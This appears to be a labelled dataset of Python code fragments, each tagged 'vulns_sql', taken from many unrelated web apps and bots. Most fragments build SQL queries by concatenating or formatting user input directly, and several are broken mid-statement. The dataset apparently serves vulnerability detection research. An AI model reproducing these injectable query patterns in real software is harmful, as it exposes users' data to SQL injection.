"        user_id   = request.form.get('userId')        print(user_id)        print(firstname)        print(lastname)        """"""        Need to work around nonetype and isalnum()        if fistname == None:            temp1 = """"            temp2 = """"            temp3 = """"        Then check if temp 1, 2 or 3 are alphanumeric        """"""        if not (firstname.isalnum() and lastname.isalnum() \                and username.isalnum()):",vulns_sql
"    updated = False        """"""        info = (username, firstname, lastname, bio, password)        cur.execute(cmd, info)        """"""            cur.execute('UPDATE users SET firstname = ? WHERE id = ? LIMIT 1;',            cur.execute('UPDATE users SET lastname = ? WHERE id = ? LIMIT 1;',            cur.execute('UPDATE users SET username = ? WHERE id = ? LIMIT 1;',            cur.execute('UPDATE users SET password = ? WHERE id = ? LIMIT 1;',            cur.execute('UPDATE users SET bio = ? WHERE id = ? LIMIT 1;',",vulns_sql
"                      VALUES (""{0}"", ""{1}"", ""{2}"", ""{3}"", ""{4}"", {5});            """""".format(str(comment['userId']), str(comment['username']),            comment_cur.execute(cmd1)",vulns_sql
"                updated_comments = comment_id ",vulns_sql
"    cmd = """"""SELECT * FROM messages              ORDER BY timeposted DESC ",vulns_sql
"		cursor.execute(""SELECT * from Users where emailAccount='"" + username + ""' and password='"" + password + ""'"")",vulns_sql
"        cursor.execute(""SELECT * from Users where emailAccount='"" + emailAccount + ""'"")",vulns_sql
"		cursor.execute(""SELECT * from Users where emailAccount='"" + session['username'] + ""'"")",vulns_sql
"		cursor.execute(""SELECT * from Users where emailAccount='"" + session['username'] + ""'"")",vulns_sql
"		cursor.execute(""SELECT * from Users where emailAccount='"" + session['username'] + ""'"")",vulns_sql
"		cursor.execute(""SELECT courseName,courseOverview from courses where courseAbbreviation='"" + classNoSpace + ""'"")",vulns_sql
"		cursor.execute(""SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation='"" + course + ""'"")",vulns_sql
"				cursor.execute(""SELECT courseId FROM courses WHERE courseAbbreviation='"" + course +""'"")				cursor.execute(""SELECT courseConcentration FROM courses WHERE courseAbbreviation='"" + course +""'"")				cursor.execute(""DELETE FROM results WHERE emailAccount='"" + session['username'] + ""' and courseId="" + str(courseId[0]))				cursor.execute(""INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('"" + session['username'] + ""',"" + str(courseId[0]) + "",'"" + str(courseConcentration[0]) + ""',"" + str(score) + "","" + str(rank) + "","" + str(total) + "")"")				cursor.execute(""UPDATE users SET "" + course.lower() + ""Completed=1 WHERE emailAccount='"" + session['username'] + ""'"")",vulns_sql
"		cursor.execute(""SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount='"" + session['username'] + ""'"");",vulns_sql
"					""('%s', '%s', '%s', '%s', '%s', '%s', '%s')"" % (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion)		self.cur.execute(sql)					""('%s', '%s', '%s', '%s', '%s', '%s', '%s')"" % (qhash, datetime.now(), is_know, reason, label, ip, browser)		self.cur.execute(sql)",vulns_sql
"					""('%s', '%s', '%s', '%s', '%s', '%s', '%s')"" % (ahash, datetime.now(), is_relevant, reason, label, ip, browser)		self.cur.execute(sql)",vulns_sql
from app.Data.helpers import table_name_to_object,vulns_sql
"            condition += '\'' + request.form[conditions[0]] + '\''        delete_rows(table.name, condition)        create_action('rows deleted with condition ""{0}""'                      .format(condition), dataset.id, current_user.id                      )    except:    else:        flash('successfully deleted rows using condition ""{0}""'              .format(condition), 'success'              )",vulns_sql
        elif current_type == 'timestamp with time zone':,vulns_sql
        if current_type == 'timestamp with time zone':,vulns_sql
                'TYPE TIMESTAMP WITH TIME ZONE'                'TYPE TIMESTAMP WITH TIME ZONE ',vulns_sql
    db.engine.execute(,vulns_sql
"            f""""""INSERT INTO user_info (member_id, {column})                     VALUES ({member_id}, {col_value})                    ON CONFLICT (member_id)                        DO UPDATE SET {column} = {col_value};"""""")        await self.db_conn.execute(execute)",vulns_sql
"from flask import Flask, g, render_template, request, jsonifyfrom utils import get_db, get_queries, shutdown, ajax, execute_query, generic_searchatexit.register(shutdown, app=app, context=g)",vulns_sql
"    con = get_db(app, g)",vulns_sql
"    data = generic_search(keywords, tables, app, g)    return jsonify(data)        return render_template('queries-form.html', queries=get_queries(app, g))    query = get_queries(app, g)[query_key]    (schema, data) = execute_query(app, g, query)",vulns_sql
"    query = 'SELECT table_name FROM user_tables'    data = execute_query(app, g, query)[1]    return jsonify(data)",vulns_sql
"from flask import abort, requestdef get_db(app, context):    """""" Connect to the database and return connection """"""    if not hasattr(context, 'db'):        dsn_tns = cx_Oracle.makedsn(app.config['DB_SERVER'],                                    app.config['DB_PORT'],                                    app.config['DB_SID'])        context.db = cx_Oracle.connect(app.config['DB_USER'],                                       app.config['DB_PWD'],                                       dsn_tns)    return context.dbdef get_queries(app, context):    """""" Parse and return predefined queries """"""    if not hasattr(context, 'queries'):        with open(app.config['QUERIES_PATH'], 'r') as fd:            sqlFile = fd.read()        sqlCommands = sqlFile.split(';')        context.queries = {}        for command in sqlCommands:            command = re.sub(r'\s*--\s*|\s*\n\s*', ' ', command)            query = command.split(':')            context.queries[query[0]] = query[1]    return context.queriesdef execute_query(app, context, query):    con = get_db(app, context)    cur.execute(query)def generic_search(keywords, tables, app, context):        query = 'SELECT * FROM {} WHERE 1=0'.format(table)        description = execute_query(app, context, query)[0]        for col in description:            conditions.append('{} LIKE \'%{}%\''.format(col, keywords))        (schema, data) = execute_query(app, context, query)        result.append((table, schema, data))",vulns_sql
"def shutdown(app, context):    """""" Clean-up application state before shutdown """"""    with app.app_context():        get_db(app, context).close()",vulns_sql
"                con_ex.execute(""INSERT INTO reminder (type, channel, message, date) VALUES ('0', {}, '{}', '{}');""                               .format(author_id, msg, date.strftime('%Y-%m-%d %X')))",vulns_sql
        print(''),vulns_sql
"                con_ex.execute(""INSERT INTO reminder (type, channel, message, date) VALUES ('1', {}, '{}', '{}');""                               .format(channel_id, msg, str(date)))",vulns_sql
        print(''),vulns_sql
            query = query.order_by(order_column + ' ' + order_direction),vulns_sql
"            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))",vulns_sql
            query = query.order_by(order_column + ' ' + order_direction),vulns_sql
"            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))",vulns_sql
            query = query.order_by(order_column + ' ' + order_direction),vulns_sql
"            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))",vulns_sql
            query = query.order_by(order_column + ' ' + order_direction),vulns_sql
"            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))",vulns_sql
            query = query.order_by(order_column + ' ' + order_direction),vulns_sql
"            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))",vulns_sql
"    query = ""delete from converts where enzyme_name = '%s'"" % enzyme_nameif enzyme_name3:    query = ""delete from enzyme where enzyme_name = '%s'"" % enzyme_name3if process_name:    query = ""delete from process where process_name = '%s'"" % process_name    query = ""delete from uses where process_name = '%s' and enzyme_name = '%s'"" % (process_name2, enzyme_name2)    query = ""delete from conds where concentration = '%s' and compound = '%s'"" % (conc, compound)    query = ""delete from intermediate where intermediate_name = '%s'"" % intermediate    query = ""delete from location where organelle = '%s' and substructure = '%s'"" % (organelle, sub)    query = ""delete from located_in where enzyme_name = '%s' and organelle = '%s'"" % (enzyme_name3, organelle2)    query = ""delete from operates_uner where process_name = '%s' and concentration = '%s' and compound = '%s'"" % (process_name3, conc2, compound2)",vulns_sql
    cursor.execute(query),vulns_sql
"if values:   # make sure not empty to split and then split on the comma    values = values.split(', ')svalues = """"        svalues += ""'%s', "" % value.strip()    svalues = svalues[:-2]",vulns_sql
"    query = ""insert into %s values (%s)"" % (insert_table, svalues)",vulns_sql
        cursor.execute(query),vulns_sql
"    temps = svalues.split("", "")    for s in temps:        print(""<b> | %s"" % s[1:-1])",vulns_sql
"    query = ""select process_name from uses where enzyme_name = '%s'""  % search_enzyme    query = ""select enzyme_name from uses where process_name = '%s'"" % search_process1    query = ""select distinct organelle from uses natural join located_in where process_name = '%s'"" % search_process2    query = ""select ligand_mechanism from enzyme where enzyme_name = '%s'"" % search_enzyme2    query = ""select goal_product from process where process_name = '%s'"" % search_process3    query = ""select organelle from location where substructure = '%s'"" % sub    query = ""select concentration from conds where compound = '%s'"" % inter    query = ""select concentration, compound from operates_under where process_name = '%s'"" % search_process5    query = ""select product_name from converts where enzyme_name = '%s' and reactant_name = '%s'"" % (search_enzyme3, reac)    query = ""select organelle from located_in where enzyme_name = '%s'"" % search_enzyme4    query = ""select concenration from intermediate where intermediate_name = '%s'"" % inter2",vulns_sql
        cursor.execute(query)        ,vulns_sql
"    query = ""update converts set product_name = '%s' where enzyme_name = '%s'"" % (product_name, enzyme_name)    query2 = ""select * from converts where product_name = '%s' and enzyme_name = '%s'"" % (product_name, enzyme_name)    query = ""update enzyme set ligand_mechanism = '%s' where enzyme_name = '%s'"" % (mechanism_name, enzyme_name2)    query2 = ""select * from enzyme where enzyme_name = '%s'"" % enzyme_name2    query = ""update operates_under set concentration = '%s', compound = '%s' where process_name = '%s'"" % (concentration, compound_name, process_name)    query2 = ""select * from operates_under where process_name = '%s'"" % process_name    query = ""update process set goal_product = '%s' where process_name = '%s'"" % (goal, process_name2)    query2 = ""select * from process where process_name = '%s'"" % process_name2    query = ""update intermediate set concenration = '%s' where intermediate_name = '%s'"" % (conc, inter)    query2 = ""select * from intermediate where intermediate_name = '%s'"" % inter    query = ""update uses set enzyme_name = '%s' where process_name = '%s'"" % (enzyme_name3, process_name3)    query2 = ""select * from uses where process_name = '%s' and enzyme_name = '%s'"" % (process_name3, enzyme_name3)    query = ""update located_in set organelle = '%s', substructure = '%s' where enzyme_name = '%s' and substructure = '%s'"" % (organelle, sub, enzyme_name4, sub4)    query2 = ""select * from located_in where enzyme_name = '%s'"" % enzyme_name4    query = ""update location set substructure = '%s' where organelle = '%s' and substructure = '%s'"" % (sub2, organelle2, sub3)    query2 = ""select * from location where organelle = '%s' and substructure = '%s'"" % (organelle2, sub2)    query = ""update conds set prime_location = '%s' where concentration = '%s' and compound = '%s'"" % (loc, conc2, comp)    query2 = ""select * from conds where concentration = '%s' and compound = '%s' and prime_location = '%s'"" % (conc2, comp, loc)",vulns_sql
        cursor.execute(query),vulns_sql
    cursor.execute(query2),vulns_sql
"        features = (image_data.camera, image_data.lens, image_data.country['en-US'])",vulns_sql
                 'WHERE chat_id !={}'.format(config.MY_TELEGRAM))            cursor = db.execute_query(query),vulns_sql
"                 ""WHERE time > '{}'"".format(today))            cursor = db.execute_query(query)                 ""WHERE time > '{}' ""                 ""AND chat_id !={}"".format(today, config.MY_TELEGRAM))            cursor = db.execute_query(query)",vulns_sql
"                 ""WHERE time > '{}'"".format(today))            cursor = db.execute_query(query)",vulns_sql
"                 ""WHERE time > '{}'"".format(today))            cursor = db.execute_query(query)",vulns_sql
    query = ('SELECT {0} FROM photo_queries_table2 '             'GROUP BY {0} '             'ORDER BY count({0}) '             'DESC'.format(item_type)),vulns_sql
"             ""WHERE {}='{}'"".format(feature_type, feature))        cursor = db.execute_query(query)",vulns_sql
"    def add(self, query):            self.execute_query(query)",vulns_sql
"                         'WHERE wrong_tag=""{}""'.format(tag))                cursor = db.execute_query(query)",vulns_sql
"                 f""SET language='{self.language}' ""                 f""WHERE chat_id='{self.chat_id}'"")            db.add(query)",vulns_sql
                 f'DESC LIMIT {limit}')            cursor = db.execute_query(query),vulns_sql
                 f'LIMIT {limit}')            cursor = db.execute_query(query),vulns_sql
"                 f""VALUES ({user.chat_id}, '{user.first_name}', ""                 f""'{user.nickname}', '{user.last_name}', '{user.language}')"")            db.add(query)",vulns_sql
"                 f""SET first_name='{user.first_name}', ""                 f""nickname='{user.nickname}', ""                 f""last_name='{user.last_name}' ""                 f""WHERE chat_id={user.chat_id}"")            db.add(query)",vulns_sql
                 f'WHERE chat_id={message.chat.id}')            cursor = db.execute_query(query),vulns_sql
"import discord, yaml, vroll, pgsql, re",vulns_sql
"    query = """"""    SELECT id, tier, creator, description FROM quests    WHERE completed = 'f'    {}    {}    {};    """""".format(idformat, tierformat, creatorformat)    query_return = pgsql.retrieve_quest_data(pg_connection, query) # Execute our query",vulns_sql
        print(len(query_return)),vulns_sql
"def retrieve_quest_data(pg_connection, query):    conn = psycopg2.connect(        dbname=pg_connection['database'],        user=pg_connection['user'],        password=pg_connection['password'],        host=pg_connection['host'])    cur = conn.cursor()    cur.execute(query)    results = list(cur.fetchall())    cur.close()    conn.close()    return resultsdef retrieve_all_quests(pg_connection):",vulns_sql
"    WHERE completed = 'f';    """""")    results = cur.fetchall()",vulns_sql
"            query = 'SELECT id, name FROM ""%s"" WHERE ""%s"" is NULL' % (",vulns_sql
"                query = 'UPDATE ""%s"" SET ""%s""=%%s WHERE id = %s' % (",vulns_sql
"from odoo.addons.base_crapo_workflow.mixins.crapo_readonly_view_mixin import (    ReadonlyViewMixin,)",vulns_sql
"                [safe_eval(domain, {""field_name"": field_name}) for domain in lst_domain]",vulns_sql
"from odoo.addons.base_crapo_workflow.mixins import (    crapo_automata_mixins,)  # pylint: disable=odoo-addons-relative-importclass CrapoBusinessObject(crapo_automata_mixins.ObjectWithStateMixin, models.Model):",vulns_sql
from odoo.addons.base_crapo_workflow.mixins import (,vulns_sql
"    name = fields.Char(help=""State's name"", required=True, translate=True, size=32)        default=1, help=""Sequence gives the order in which states are displayed""",vulns_sql
"            query = 'SELECT id, name FROM ""%s"" WHERE ""%s"" is NULL' % (                self._table,                column_name,            self.env.cr.execute(query)                query = 'UPDATE ""%s"" SET ""%s""=%%s WHERE id = %s' % (                    self._table,                    column_name,                    stage[0],                self.env.cr.execute(query, (default_value.id,))",vulns_sql
"            self.env.cr.execute(                ""SELECT id, name FROM %s WHERE %s is NULL"",                (self._table, column_name),                self.env.cr.execute(                    ""UPDATE %s SET %s=%s WHERE id = %s"",                    (self._table, column_name, default_value.id, stage[0]),",vulns_sql
"            tname = Identifier(self._table).as_string(            cname = Identifier(column_name).as_string(                ""MMMMMAIS %s (%s) -> %s"", tname, type(tname), str(tname)                ""SELECT id, name FROM %s WHERE %s is NULL"", (tname, cname)",vulns_sql
"                    (tname, cname, default_value.id, stage[0]),",vulns_sql
from psycopg2.sql import Identifier,vulns_sql
"            tname = Identifier(self._table.replace('""', """")).as_string(                self.env.cr._obj  # pylint: disable=protected-access            )            cname = Identifier(column_name.replace('""', """")).as_string(                self.env.cr._obj  # pylint: disable=protected-access            )            logging.error(                ""MMMMMAIS %s ==> %s (%s) -> %s"",                self._table,                tname,                type(tname),                str(tname),            )            self.env.cr.execute(                ""SELECT id, name FROM %s WHERE %s is NULL"",                (self._table, cname),            )                self.env.cr.execute(                    ""UPDATE %s SET %s=%s WHERE id = %s"",                    (self._table, cname, default_value.id, stage[0]),                )",vulns_sql
"        end = str(end)        if('.' in end): end = end+'999'        where_clause += ' AND zero <= ' + end        where_clause += ' AND zero >= ' + str(start)        where_clause += ' AND zero >= {} AND zero <= {}'.format(start, end)        where_clause += ' AND degree = ' + str(degree)",vulns_sql
    c.execute(query),vulns_sql
"                cur.execute(""select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada like '%s' or artha like '%s' order by id limit %d offset %d;"" % (term, term, limit, offset))",vulns_sql
"            cur.execute(""select * from mula where sloka_number = '%s' order by sloka_line;"" % sloka_number)            cur.execute(""select * from pada where sloka_number = '%s' order by id;"" % sloka_number)",vulns_sql
"            cur.execute(""select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada.varga = '%s' order by random() limit 1;"" % varga)            cur.execute(""select pada from pada where varga = '%s' and artha = '%s' order by id"" % (varga, artha));",vulns_sql
"            cur.execute(""select * from mula where varga = '%s';"" % varga)            mula = cur.fetchall();",vulns_sql
"        self.env.cr.execute(""""""CREATE or REPLACE VIEW %s as (            %s            %s            )"""""" % (self._table,                    self._select(),                    self._from(),                    self._group_by()))",vulns_sql
"def queryAll(cursor, reqString):        cursor.execute(reqString)def queryOne(cursor, reqString):        cursor.execute(reqString)",vulns_sql
"    req = ""SELECT question from {} WHERE name = '{}'"".format(CFG(""poll_table_name""), poll_name)    tmp = queryOne(c, req)",vulns_sql
"    req = ""UPDATE {} SET \""options_selected\""='{}' WHERE token='{}'"".format(CFG(""tokens_table_name""), \                    optStr, token)    c.execute(req)",vulns_sql
"    req = ""SELECT name, options_selected from {} where token='{}'"".format(CFG(""tokens_table_name""), token)    answer = queryAll(cursor, req)    req = ""SELECT poll_name from {} where adm_token = \""{}\"""".format(CFG(""admintoken_table_name""), adm_token)    answer = queryOne(c, req)    req = ""SELECT *  from {} where adm_token='{}'"".format(CFG(""admintoken_table_name""), adm_token)    answer = bool(queryOne(c, req))    req = ""SELECT * from {} where token='{}'"".format(CFG(""tokens_table_name""), token)    answer = bool(queryOne(c, req))    req = ""SELECT name from {} where token='{}'"".format(CFG(""tokens_table_name""), token)    answer = queryOne(c, req)        req = ""SELECT poll_name from {} where adm_token='{}'"".format(CFG(""admintoken_table_name""), token)        answer = queryOne(c, req)    req = ""SELECT has_tokens FROM {} WHERE name = '{}'"".format(CFG(""poll_table_name""), poll_name)    return queryOne(cursor, req) == 1;    req = ""UPDATE {} SET count=count+1 WHERE name_option = '{}';"".format(CFG(""options_table_name""), key)    cursor.execute(req)    req = ""SELECT multi FROM {} WHERE name = '{}'"".format(CFG(""poll_table_name""), poll_name)    ret = queryOne(c, req) == 1",vulns_sql
"    req = ""SELECT \""count\"" FROM {table} WHERE \""name_option\"" = '{key}'"".format(                    table=CFG(""options_table_name""),key=key)    count = queryOne(c, req)    req = ""SELECT options from {} where name = '{}'"".format(CFG(""poll_table_name""), poll_name)    options_str = queryOne(c, req)",vulns_sql
"    req = ""SELECT token FROM {} WHERE name='{}'"".format(CFG(""tokens_table_name""), poll_name)    tmp = queryAll(c, req)",vulns_sql
"    req = ""SELECT adm_token FROM {} WHERE poll_name='{}'"".format(CFG(""admintoken_table_name""), poll_name)    admtok = queryOne(c, req)    req = ""SELECT EXISTS( SELECT 1 FROM {} WHERE name='{}')"".format(CFG(""poll_table_name""), poll_name)    tmp = queryOne(c, req)",vulns_sql
"    options_str = queryOne(c, ""SELECT options FROM {} WHERE name='{}'"".format(CFG(""poll_table_name""), poll_name))",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES \                    ('{}');"".format(data)                cursor.execute(query)",vulns_sql
import ugssettings,vulns_sql
            try:                sku = item['SKU']            except:                sku = ''            curr_ex_vat = curr_ebay_price / ugssettings.VAT            hit_count = 0 #int(item['HitCount'])            watch_count = 0 #int(item['WatchCount'])            question_count = 0 # int(item['TotalQuestionCount']),vulns_sql
"            ""ActiveList"":{            },        }",vulns_sql
"        )    sql2 = """"""truncate table `zEbayListings` """"""",vulns_sql
"    insert into `zEbayListings`    values('{sku}', '{ebay_id}', {qty}, {price}, '{site}', {hit_count}, {watch_count}, {question_count})    """""".format(sku=sku, ebay_id=ebay_id, qty=qty, price=price, site=site,               hit_count=hits, watch_count=watches, question_count=questions)    frappe.db.sql(sql, auto_commit=True)",vulns_sql
"    update `tabItem` it    set it.on_sale_from_date = '%s'    where it.on_sale_from_date is NULL    and it.ebay_id REGEXP '^[0-9]+$';    """"""%date_today.isoformat()        frappe.db.sql(sql, auto_commit=True)",vulns_sql
"                    'The ebay item cannot be found on ERPNEXT so unable to record ebay id', r.live_ebay_id)",vulns_sql
"def login():   if request.method == 'POST':      session['username'] = request.form['username']      return redirect(url_for('index'))",vulns_sql
"            result = db.execute(""INSERT INTO accounts (username, password) VALUES (:u, :p)"", {""u"": usern, ""p"": passw_hash})",vulns_sql
"        ""page"": int(page),        ""perPage"": int(perPage),        ""rating"": int(rating),        ""search"": search",vulns_sql
"PRODUCTS_TYPES_TABLE = ""product_types""            f""""""            SELECT name            FROM {PRODUCTS_TYPES_TABLE}",vulns_sql
"PRODUCTS_TABLE = ""products""PRODUCTS_TYPES_TABLE = ""product_types""REVIEWS_TABLE = ""reviews""USERS_TABLE = ""users""            f""""""            FROM {PRODUCTS_TABLE} AS p INNER JOIN {PRODUCTS_TYPES_TABLE} AS pt ON            WHERE p.rating >= {filters['rating']}            ORDER BY p.id LIMIT {offset}, {filters['perPage']}            cursor.execute(sql_query)",vulns_sql
"            f""""""            FROM {PRODUCTS_TABLE} AS p INNER JOIN {PRODUCTS_TYPES_TABLE} AS pt ON            WHERE p.rating >= {filters['rating']}            AND pt.name = '{department}'            ORDER BY p.id LIMIT {offset}, {filters['perPage']}            cursor.execute(sql_query)",vulns_sql
"            f""""""            FROM {PRODUCTS_TABLE} AS p INNER JOIN {PRODUCTS_TYPES_TABLE} AS pt ON            WHERE p.rating >= {filters['rating']}            AND p.name LIKE '%{search}%'            ORDER BY p.id LIMIT {offset}, {filters['perPage']}            cursor.execute(sql_query)            f""""""            FROM products AS p            WHERE p.rating >= {filters['rating']}            cursor.execute(sql_query)            f""""""            FROM products AS p INNER JOIN {PRODUCTS_TYPES_TABLE} AS pt ON            WHERE p.rating >= {filters['rating']}            AND pt.name = '{department}'            cursor.execute(sql_query)            f""""""            FROM {PRODUCTS_TABLE} AS p INNER JOIN {PRODUCTS_TYPES_TABLE} AS pt ON            p.product_type_id=pt.id WHERE p.id={productId}            cursor.execute(sql_query)",vulns_sql
"            f""""""            FROM {PRODUCTS_TABLE} p, {REVIEWS_TABLE} r, {USERS_TABLE} u            WHERE p.id={productId} && r.user_id=u.id && r.product_id=p.id            ORDER BY r.id DESC             LIMIT {offset}, {filters['perPage']}            cursor.execute(sql_query)            f""""""            FROM {PRODUCTS_TABLE} AS p INNER JOIN {PRODUCTS_TYPES_TABLE} AS pt ON            WHERE p.rating >= {filters['rating']}            AND p.name LIKE '%{search}%'            cursor.execute(sql_query)            f""""""            FROM {REVIEWS_TABLE} AS r            WHERE r.product_id={productId}            cursor.execute(sql_query)            f""""""            INSERT INTO {REVIEWS_TABLE} (user_id, product_id, title, comment, rating)            VALUES({userId}, {productId}, '{review['title']}',            '{review['comment']}', {review['rating']})            cursor.execute(sql_query)",vulns_sql
"USERS_TABLE = ""users""CARTS_TABLE = ""carts""PRODUCTS_TABLE = ""products""INVOICES_TABLE = ""invoices""INVOICE_PRODUCTS_TABLE = ""invoice_products""            f""""""            FROM {USERS_TABLE}",vulns_sql
"            f""""""            SELECT * FROM {USERS_TABLE} WHERE id=%s            cursor.execute(sql_query, (id))                    'lastName': user['last_name'], 'username' : user['username']}        sql_query = (""select t2.id as id_invoice , t2.transaction_date, sum(t3.price * t1.quantity) as montant from  invoice_products as t1 inner join invoices  as t2 on  t2.id = t1.invoice_id inner join  products  as t3 on  t3.id = t1.product_id  and t2.user_id= %s group by  t2.id, t2.transaction_date order by  t2.transaction_date DESC"")            cursor.execute(sql_query, (id))        sql_query = (""select i.transaction_date, ip.invoice_id, p.name, ip.quantity, p.price from invoice_products as ip, products as p, invoices as i where invoice_id = %s and ip.product_id = p.id and ip.invoice_id = i.id;"")            cursor.execute(sql_query, (id))            f""""""            INSERT INTO {CARTS_TABLE} (user_id, product_id, quantity)            VALUES({userId}, {productId}, {cart['quantity']})            cursor.execute(sql_query)",vulns_sql
"            f""""""            FROM {PRODUCTS_TABLE} AS p INNER JOIN {CARTS_TABLE} AS c ON            WHERE c.user_id={userId}            cursor.execute(sql_query)            f""""""            DELETE FROM {CARTS_TABLE}             WHERE user_id={userId} && product_id={productId}            cursor.execute(sql_query)",vulns_sql
"            f""""""            DELETE FROM {CARTS_TABLE}             WHERE user_id={userId}            cursor.execute(sql_query)",vulns_sql
"            f""""""            INSERT INTO {INVOICES_TABLE} (user_id)            VALUES ({userId})            cursor.execute(sql_query)",vulns_sql
"            f""""""            SELECT id from {INVOICES_TABLE}            WHERE user_id={userId}            cursor.execute(sql_query)            f""""""            UPDATE {CARTS_TABLE}            SET quantity = {quantity}            WHERE user_id = {userId} AND product_id = {productId};            cursor.execute(sql_query)",vulns_sql
"        invoice_products_values = UsersRepository.create_invoice_products_values_query(invoiceId, products)        print(""Result:"")        print(invoice_products_values)            INSERT INTO {INVOICE_PRODUCTS_TABLE} (invoice_id, product_id, quantity)",vulns_sql
    from app.questions.api.v1.view import question_blueprint,vulns_sql
"from flask import Blueprint, request, make_response, jsonify",vulns_sql
"        response = Table.update(question_id, answer_id, data)",vulns_sql
"    """"""    Create API Resource    """"""        post_data = request.get_json(force=True)        response = Table.save(str(question_id), data=post_data)",vulns_sql
"    def get(self, instance_id=None, user_id=None):        if instance_id:            query = {                'instance_id': instance_id,                'user_id': user_id            }            results = Table.filter_by(**query)                    'results': 'Instance not found',                    'status': 'error'                'results': results,                'status': 'success'        response_object = {            'results': Table.query(),            'status': 'success'        }",vulns_sql
"    '/api/v1/questions/<int:question_id>/answers',",vulns_sql
"import unittestfrom ... import create_appapp = create_app(""config.TestConfig"")class BaseTestCase(unittest.TestCase):    """"""A base test case.""""""    def create_app(self):        app.config.from_object('config.TestConfig')        return app    def setUp(self):        self.client = app.test_client()        self.data = {            'username': 'Paul',            'email': 'pkinuthia10@gmail.com',            'password': 'password'        }        """""" Login to get a JWT token """"""        self.client.post('/api/v1/auth/signup', json=self.data)        response = self.client.post('/api/v1/auth/login', json=self.data)        self.token = response.get_json().get('auth_token')        self.user_id = str(response.get_json()['id'])    def tearDown(self):        p",vulns_sql
from .base import BaseTestCase,vulns_sql
"from flask import Blueprint, request, make_response, jsonify    """"""    User Signup API Resource    """"""        post_data = request.get_json(force=True)        user = Table.filter_by(post_data.get('email'))                user = Table.save(data=post_data)                    'id': user.get('id'),                    'auth_token': auth_token                    'status': 'fail',                    'message': 'Some error occurred. Please try again.'                'status': 'fail',                'message': 'User already exists. Please Log in.',        post_data = request.get_json(force=True)        Table.delete(user_id, post_data)            'status': 'success',            'message': 'User deleted successfully.',",vulns_sql
"        post_data = request.get_json(force=True)            user = Table.filter_by(email=post_data.get('email'))            if len(user) >= 1 and post_data.get('password'):                if str(user[0][3]) == str(post_data.get('password')):                    auth_token = encode_auth_token(user[0][0])                    response_object = {                        'status': 'fail',                        'message': 'Password or email do not match.'                    }                            'status': 'success',                            'id': user[0][0],                    print(e)                response_object = {                    'status': 'fail',                    'message': 'User does not exist.'                }            response_object = {                'status': 'fail',                'message': 'Try again'            }",vulns_sql
"            user = Table.filter_by(email=None, user_id=user_id)",vulns_sql
"            'results': Table.query(),",vulns_sql
"        instance = Table.save(self.data)        assert instance == self.data        isinstance(Table.query(), type([]))",vulns_sql
"        post_data = request.get_json(force=True)        response = Table.save(answer_id, data=post_data)",vulns_sql
db = Database(BaseConfig.SQLALCHEMY_DATABASE_URI),vulns_sql
"    query_string = """"""        FROM pub_2018, plainto_tsquery('english', '{}') query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery",vulns_sql
"    query_string = ur""""""        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE '%{query}%')            SELECT regexp_matches(lower_title, '({query}\w*?\M)', 'g') as match FROM s            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{1}})\M', 'g') as match FROM s            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{2}})\M', 'g') as match FROM s            SELECT regexp_matches(lower_title, '({query}\w*?(?:\s+\w+){{3}}|)\M', 'g') as match FROM s        LIMIT 50;"""""".format(query=query)    rows = db.engine.execute(sql.text(query_string)).fetchall()",vulns_sql
        cursor = db.cursor()        cursor.execute(FLOWS),vulns_sql
"        self.filter_string = ""{0} = {1}"".format(self.name, value)",vulns_sql
        self.filter_tuples = (),vulns_sql
"        cursor.execute(q, self.filter_tuples)",vulns_sql
            passwd=pw,vulns_sql
"        FLOWS = self.schema.flows()        cursor = db.cursor()        cursor.execute(""USE testgoflow"")        cursor.execute(FLOWS)",vulns_sql
"        self.filter_string = ""{0} = {1}"".format(self.name, value)",vulns_sql
"        self.filter_string = ""{0} = {1}"".format(self.name, value)",vulns_sql
        print(self.filter_string),vulns_sql
        print(q),vulns_sql
        print(q),vulns_sql
        cursor = db.cursor()        cursor.execute(FLOWS_PER_IP),vulns_sql
"            self.filter_string = ""({0} << '{1}'"".format(self.name, value)            self.filter_string = ""{0} = '{1}'"".format(self.name, value)",vulns_sql
"            ip = ipaddress.ip_network(value, strict=False)            start_ip = ip.network_address            end_ip = ip.broadcast_address            self.filter_string = ""({0} > {1} AND {0} < {2})"".format(self.name, int(start_ip), int(end_ip))            ip = ipaddress.ip_address(value)            self.filter_string = ""{0} = {1}"".format(self.name, int(ip))",vulns_sql
"		and c.email_id='{email_id}'"""""".format(email_id=sender))",vulns_sql
"		and c.email_id='{email_id}'"""""".format(email_id=sender))",vulns_sql
    query = '''select * from usr where email like\'''' + email + '\''    cursor = g.conn.execute(query),vulns_sql
"        where ap.uemail = \'''' + session[""user_id""] + '\' and ap.jid = tmp.jid and ap.vtype = tmp.type'        cursor = g.conn.execute(text(query))",vulns_sql
            query += 'where v.posting_time>=\'' + ptf + '\' and v.posting_time<=\'' + ptt + '\' and '            query += 'where v.posting_time>=\'' + ptf + '\' and '            query += 'where v.posting_time<=\'' + ptt + '\' and '            query += 'lower(j.name) like lower(\'%' + key + '%\') '    # use lower() to ignore case             query += 'v.sal_from <= ' + key + ' and v.sal_to >=' + key + ' '            query += 'j.pre_skl like \'%' + key + '%\' or j.job_des like \'%''' + key + '%\' ',vulns_sql
"            query += ' limit ' + limit        cursor = g.conn.execute(text(query))  # !Very important here, must convert type text()",vulns_sql
        query = '''select * from usr where email like\''''+eid+'\''        cursor = g.conn.execute(query),vulns_sql
